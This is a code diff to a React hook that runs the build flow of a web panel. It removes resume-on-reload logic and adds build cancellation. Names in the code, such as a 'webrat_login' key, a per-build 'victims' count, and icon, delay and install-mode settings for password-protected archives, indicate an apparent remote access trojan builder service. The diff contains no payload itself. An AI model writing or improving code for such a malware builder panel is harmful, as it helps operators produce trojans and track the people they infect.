@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useRef } from "react";
+import { useCallback, useRef } from "react";
 
 import { resolveAccountLogin } from "../services/get-account-login";
 import { downloadCompileResult, enqueueCompileGoFromConfig, waitCompileDone } from "../services/compile-go-config";
@@ -13,9 +13,7 @@ import { formatCreated } from "./build-flow/format-created";
 import {
    clearActiveBuild,
    dedupeHistoryByBuildId,
-   loadActiveBuild,
    loadBuildsHistory,
-   markJobFinalized,
    saveActiveBuild,
    saveBuildsHistory,
 } from "./build-flow/storage";
@@ -31,82 +29,25 @@ export function useBuilderBuildFlow(opts: {
    const { iconBase64, setIconBase64, delay, setDelay, setInstallMode } = opts;
 
    const buildingRef = useRef(false);
+   const abortRef = useRef<AbortController | null>(null);
 
-   useEffect(() => {
-      if (buildingRef.current) return;
+   const cancelBuild = useCallback(() => {
+      if (abortRef.current) {
+         abortRef.current.abort();
+         abortRef.current = null;
+      }
+      buildingRef.current = false;
 
-      void (async () => {
-         let login = "";
-         try {
-            login = String(localStorage.getItem("webrat_login") || "").trim();
-         } catch {
-            login = "";
-         }
-         if (!login) return;
+      let login = "";
+      try {
+         login = String(localStorage.getItem("webrat_login") || "").trim();
+      } catch { }
+      if (login) {
+         try { clearActiveBuild(login); } catch { }
+      }
 
-         const active = loadActiveBuild(login);
-         if (!active) return;
-
-         buildingRef.current = true;
-         setBuildingUi(true, "Build generation 0%");
-
-         try {
-            let compileTicks = 0;
-            await waitCompileDone(active.jobId, {
-               onTick: (st) => {
-                  compileTicks++;
-                  const s = String(st?.status || "");
-                  if (s === "running" || s === "pending") {
-                     const pct = Math.min(95, Math.round(compileTicks * 4));
-                     setBuildingUi(true, `Build generation ${pct}%`);
-                  }
-               },
-            });
-
-            const shouldFinalize = markJobFinalized(login, active.jobId);
-            if (shouldFinalize) {
-               setBuildingUi(true, "Downloading build: 0%");
-               const { blob, filename } = await downloadCompileResult(active.jobId, active.name, (pct) => {
-                  setBuildingUi(true, `Downloading build: ${Math.round(pct)}%`);
-               });
-               downloadBlob(blob, filename);
-            }
-
-            const resolved = await resolveAccountLogin();
-            login = resolved;
-
-            if (shouldFinalize) {
-               const buildEntry: BuildHistoryItem = {
-                  name: active.name,
-                  id: active.buildId,
-                  version: "0.22.2",
-                  created: active.created || formatCreated(new Date()),
-                  victims: 0,
-               };
-               const nextHistory = dedupeHistoryByBuildId([buildEntry, ...loadBuildsHistory(login)]);
-               saveBuildsHistory(login, nextHistory);
-               setLastBuildTimestamp(login, Date.now());
-            }
-
-            clearActiveBuild(login);
-
-            resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);
-
-            setBuildingUi(false, "Building");
-            if (shouldFinalize) {
-               openBuildModal(active.password);
-            }
-         } catch {
-            try {
-               clearActiveBuild(login);
-            } catch {
-            }
-            setBuildingUi(false, "Building");
-         } finally {
-            buildingRef.current = false;
-         }
-      })();
-   }, [setDelay, setIconBase64, setInstallMode]);
+      setBuildingUi(false, "");
+   }, []);
 
    const startBuild = useCallback(async () => {
       if (buildingRef.current) return;
@@ -204,8 +145,10 @@ export function useBuilderBuildFlow(opts: {
 
       buildingRef.current = true;
       const password = generateArchivePassword();
+      const ac = new AbortController();
+      abortRef.current = ac;
 
-      setBuildingUi(true, "Building");
+      setBuildingUi(true, "Build generation 0%");
 
       try {
          const resolved = await resolveAccountLogin();
@@ -269,6 +212,7 @@ export function useBuilderBuildFlow(opts: {
          setBuildingUi(false, "Building");
          openBuildModal(password);
       } catch (err) {
+         if (ac.signal.aborted) return;
          setBuildingUi(false, "Building");
 
          try {
@@ -292,5 +236,5 @@ export function useBuilderBuildFlow(opts: {
       }
    }, [delay, iconBase64, setDelay, setIconBase64, setInstallMode]);
 
-   return { startBuild };
+   return { startBuild, cancelBuild };
 }
